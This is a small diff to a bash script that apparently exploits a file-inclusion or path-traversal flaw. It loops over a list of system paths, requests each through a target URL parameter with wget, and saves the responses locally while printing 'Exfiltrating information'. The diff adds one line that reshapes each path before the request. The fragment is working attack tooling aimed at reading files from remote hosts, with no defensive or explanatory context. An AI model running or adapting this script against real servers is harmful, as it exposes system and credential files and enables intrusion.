@@ -27,6 +27,7 @@ else
         echo "[+] Starting the operating system enumeration process"
         echo ""
         for Enumeration in $(cat Paths.txt); do
+            Enumeration=$(echo "$Enumeration" | cut -d "." -f7)
             echo "  [*] Exfiltrating information from the $Enumeration path"
             Dump=$(echo "$Enumeration" | cut -d "/" -f5)
             wget --quiet $1=$Enumeration -O $Dump.txt
